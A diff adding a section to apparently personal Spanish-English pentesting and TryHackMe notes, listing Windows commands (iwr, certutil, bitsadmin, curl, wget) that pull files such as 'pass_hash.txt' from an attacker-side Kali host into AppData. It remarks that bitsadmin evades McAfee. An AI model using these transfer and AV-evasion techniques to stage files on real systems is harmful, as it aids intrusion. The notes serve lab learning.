@@ -163,6 +163,60 @@ Nota: UAC (de forma predeterminada) no se aplica a la cuenta de administrador lo
  ## There's difference between encoding and encrypting.
  
  Let's say you have an encrypted file, the only way to decrypt it is using key. While encoded data can be decoded immediately, without keys. It's NOT a form of encryption, it just a way of representing data.
+ 
+ ## Download files
+ 
+ ### Invoke-Web Request
+ 
+ Para descargar archivos a windows. Desde maquina Kali a Windows desde cmd.
+ 
+ ```
+ powershell.exe -command iwr -uri http://192.18.142.12:8083/staff.txt -outfile C:\Users\g\AppData\Roaming\staff.txt
+ ```
+Desde Powershell
+
+```
+ iwr -uri http://192.168.1.128:8083/staff.txt -outfile C:\Users\g\AppData\Roaming\staff.txt
+ iwr -uri http://192.168.2.128:8083/staff.txt -o C:\Users\g\AppData\Roaming\staff.txt
+```
+### Certutil
+
+The purpose of the certutil was originally for certificate and CA management, but can also be used for file transfer.  se puede usar desde powershell o cmd.
+Lo detecta el antivirus.
+
+```
+certutil -urlcache -f http://192.68.142.128:8083/pass_hash.txt pass_hash.txt
+```
+
+### Bitsadmin
+
+Bitsadmin es una herramienta de línea de comandos disponible en sistemas operativos Windows que permite administrar y monitorear tareas relacionadas con BITS (Background Intelligent Transfer Service), que es un servicio de transferencia de archivos en segundo plano utilizado para descargas y actualizaciones automáticas en Windows.
+
+Bitsadmin permite crear, pausar, reanudar y cancelar tareas de transferencia de archivos, así como monitorear el progreso de las mismas y ver estadísticas sobre el uso de red y recursos del sistema.
+
+Esta herramienta es útil para administrar descargas y actualizaciones en entornos empresariales donde se realizan tareas de mantenimiento en múltiples computadoras y se requiere un control centralizado sobre la transferencia de archivos en segundo plano.
+
+Desde CMD Tambien funciona desde powershell y ademas es indetectable para el mcafee.
+
+```
+bitsadmin /transfer job http://192.18.142.128:8083/pass_hash.txt C:\Users\g\AppData\Roaming\pass_hash.txt
+
+```
+
+### Curl
+
+Yo no sabia pero esta en windows tanto en CMD como el PowerShell.
+
+```
+curl http://192.168.142.128:8083/pass_hash.txt -o C:\Users\g\AppData\Roaming\pass_hash.txt
+```
+### wget
+
+Solo esta en powershell
+
+```
+wget http://192.168.142.8:8083/pass_hash.txt -outfile C:\Users\g\AppData\Roaming\pass_hash.txt
+```
 
 ## Lian_Yu (Tryhackme)
 
